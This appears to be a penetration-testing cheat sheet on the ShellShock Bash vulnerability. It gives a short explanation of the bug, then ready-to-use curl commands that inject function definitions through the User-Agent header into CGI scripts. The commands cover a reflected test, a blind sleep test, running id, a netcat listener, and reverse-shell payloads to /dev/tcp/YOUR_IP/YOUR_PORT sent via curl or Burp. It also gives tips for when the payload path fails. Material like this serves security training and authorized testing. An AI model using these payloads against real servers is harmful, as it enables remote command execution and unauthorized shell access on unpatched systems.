# ShellShock

## ShellShock

Is a security bug in the Unix Bash shell that causes Bash to execute bash commands from environment variables. The vulnerability relies on the fact that BASH incorrectly executes trailing commands when it imports a function definition stored into an environment variable. Therefore, an attacker can execute arbitrary commands on the system or exploit other bugs that may exist in Bash's command interpreter, if the attacker has a way to manipulate the environment variable list.

The vulnerability allows us, after not correctly validating the declaration of functions in variables, to execute remote commands on systems through queries in this case by means of web requests. A common foothold can be to list the **/cgi-bin/** directory of a web page. If it exists, we can search for files with the extension **'.cgi'**, although it is not strictly necessary... because it could also be a file with a **'.sh'** extension and the effects would be the same. In case of finding these resources, we can perform tests such as those described below. 

Reflected 

```bash
curl -fs -H "user-agent: () { :; }; echo; echo 'vulnerable'" http://10.10.10.3/cgi-bin/vulnerable | grep vulnerable
```

Blind 

```bash
curl -fs -H "user-agent: () { :; }; /bin/bash -c 'sleep 5'" http://10.10.10.3/cgi-bin/vulnerable
```

Parameters:

* -f: fail silently on HTTP errors. 
* -s: silent mode. 
* -H: pass custom header\(s\) to server.

We can test this with this:

```bash
curl -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" http://TARGET_IP/cgi-bin/test/test.cgi

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Alternatively, we listen through a port on our computer via Netcat

```bash
nc -lvnp YOUR_PORT
```

Then we make the following request from the terminal to the web service:

```bash
User-Agent: () { :;}; /bin/ping -c 1 10.10.14.15
curl --silent -k -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" "https://192.168.1.X:10000/cgi-bin/filename.cgi"
```

If everything goes well and you are vulnerable to the exploitation of this vulnerability, we must gain access to the system from our listening session. 

Warning: In case /bin/bash does not work, it is recommended to try alternatives, as there are times when the absolute path of the binary is not the one we have specified, so it will require a slight manual enumeration or a simple alternative mode of connection.

Another option is from BurpSuite, we manipulate the User-Agent so that the following content appears:

```http
User-Agent: () { ignored;};/bin/bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
```

